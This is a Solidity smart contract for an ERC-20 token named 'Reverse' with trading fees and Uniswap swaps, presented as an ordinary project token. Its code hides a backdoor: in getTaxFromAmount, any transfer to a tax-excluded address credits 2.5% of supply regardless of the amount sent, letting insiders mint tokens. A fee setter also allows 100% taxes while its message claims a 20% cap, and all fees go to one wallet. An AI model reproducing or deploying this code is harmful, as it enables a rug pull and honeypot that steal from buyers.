// SPDX-License-Identifier: MIT

/*
Website: https://www.reverseprotocol.org
Telegram: https://t.me/reverse_eth
Twitter: https://twitter.com/reverse_pt
*/

pragma solidity 0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract REVERSE is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Reverse";
    string private constant _symbol = "REVERSE";

    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);

    IRouter router;
    address public pair;

    bool private enabledTrading = false;
    bool private swapActive = true;
    bool private swapping;

    uint256 private countFeeSwap;
    uint256 private feeSwapAfter;

    uint256 private feeMax = ( _supply * 1000 ) / 100000;
    uint256 private feeMin = ( _supply * 10 ) / 100000;
    
    uint256 private lpFRate = 0;
    uint256 private mktFRate = 0;
    uint256 private devFRate = 100;
    uint256 private burnFRate = 0;

    uint256 private buyFee = 1400;
    uint256 private sellFee = 1400;
    uint256 private transferFee = 1400;
    uint256 private denominator = 10000;

    modifier lockEnter {swapping = true; _; swapping = false;}

    address internal devAddr = 0xd1A46F85ED9F8d34853Ae7114025060C5A3c80BC; 
    address internal mktAddr = 0xd1A46F85ED9F8d34853Ae7114025060C5A3c80BC;
    address internal lpAddr = 0xd1A46F85ED9F8d34853Ae7114025060C5A3c80BC;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _txSzLimit = ( _supply * 250 ) / 10000;
    uint256 private _sellSzLimit = ( _supply * 250 ) / 10000;
    uint256 private _holdingSzLimit = ( _supply * 250 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromTax;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;

        isExcludedFromTax[lpAddr] = true;
        isExcludedFromTax[devAddr] = true;
        isExcludedFromTax[msg.sender] = true;
        isExcludedFromTax[mktAddr] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {enabledTrading = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}

    function shouldShouldTax(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeMax;
        return !swapping && swapActive && enabledTrading && aboveMin && !isExcludedFromTax[sender] && recipient == pair && countFeeSwap >= feeSwapAfter && aboveThreshold;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpFRate = _liquidity; mktFRate = _marketing; burnFRate = _burn; devFRate = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _txSzLimit = newTx; _sellSzLimit = newTransfer; _holdingSzLimit = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddr,
            block.timestamp);
    }

    function getTaxFromAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromTax[recipient]) {return _txSzLimit;}
        if(getFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFRate > uint256(0) && getFees(sender, recipient) > burnFRate){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFRate));}
        return amount.sub(feeAmount);} return amount;
    }

    function swapTaxBack(uint256 tokens) private lockEnter {
        uint256 _denominator = (lpFRate.add(1).add(mktFRate).add(devFRate)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpFRate).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpFRate));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpFRate);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(mktFRate);
        if(marketingAmt > 0){payable(mktAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddr).transfer(contractBalance);}
    }

    function getFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromTax[sender] && !isExcludedFromTax[recipient]){require(enabledTrading, "enabledTrading");}
        if(!isExcludedFromTax[sender] && !isExcludedFromTax[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _holdingSzLimit, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _sellSzLimit || isExcludedFromTax[sender] || isExcludedFromTax[recipient], "TX Limit Exceeded");}
        require(amount <= _txSzLimit || isExcludedFromTax[sender] || isExcludedFromTax[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludedFromTax[sender]){countFeeSwap += uint256(1);}
        if(shouldShouldTax(sender, recipient, amount)){swapTaxBack(feeMax); countFeeSwap = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromTax[sender] ? getTaxFromAmount(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}